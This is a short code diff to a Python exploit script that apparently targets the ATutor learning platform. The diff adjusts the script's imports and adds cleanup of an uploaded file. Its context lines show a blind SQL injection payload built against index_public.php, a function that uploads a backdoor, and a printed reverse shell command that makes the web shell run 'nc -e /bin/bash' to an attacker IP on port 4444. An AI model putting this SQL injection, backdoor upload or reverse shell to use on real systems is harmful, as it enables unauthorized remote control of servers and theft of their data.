@@ -1,10 +1,16 @@
+import sys
+sys.path.append('..')
+import os
+
 import asyncio
-from mysqli_template_async import get_string
-from mysqli_template_async import get_length
+from lib.mysqli_template_async import get_string
+from lib.mysqli_template_async import get_length
+
 import hashlib
 import requests
 import netifaces as ni
 import zipfile
+
 from io import BytesIO
 try:
     import uvloop
@@ -70,6 +76,7 @@ def upload_backdoor(session:requests.sessions.Session, filename:str):
         print(F"(+) Reverse shell => curl {backdoor_url}?cmd=nc%20-e%20%2Fbin%2Fbash%20{attacker_ip}%204444")
     else:
         print("(+) Backdoor Upload Failed")
+    os.remove(F'./{full_filename}')
 async def main():
     blind_sqli_truthy = lambda url, sub_query, comment: F"{url}test') OR (select if(1=1,({sub_query}),1)){comment}"
     url = "http://atutor/ATutor/mods/_standard/social/index_public.php?q="
